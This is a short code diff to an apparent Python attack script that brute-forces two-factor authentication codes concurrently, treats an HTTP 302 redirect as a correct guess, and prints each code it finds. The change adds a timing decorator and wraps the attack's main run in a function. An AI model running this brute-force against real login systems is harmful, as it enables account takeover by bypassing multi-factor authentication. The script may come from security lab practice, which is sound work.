@@ -4,6 +4,8 @@ import sys
 import requests
 from bs4 import BeautifulSoup
 
+from timeDecorator import time_decorator
+
 # Const that enables / disables noisy prints made throughout program execution.
 DEBUG_MODE = False
 # A separate const that reports progress running attack.
@@ -145,10 +147,15 @@ def concurrent_brute_force_attack(number_of_workers):
     return flattened
 
 
-# Execute attack
-results = concurrent_brute_force_attack(num_procs)
-# Filter for any dicts with 'success' status code, a.k.a status code indicating redirect and correct guess.
-successes = filter(lambda x: x['status-code'] == 302, results)
+@time_decorator
+def run_main_attack():
+    # Execute attack
+    results = concurrent_brute_force_attack(num_procs)
+    # Filter for any dicts with 'success' status code, a.k.a status code indicating redirect and correct guess.
+    successes = filter(lambda x: x['status-code'] == 302, results)
 
-for success in successes:
-    print(f'Found successful 2fa code for login: {success["mfa-code"]}')
+    for success in successes:
+        print(f'Found successful 2fa code for login: {success["mfa-code"]}')
+
+
+run_main_attack()
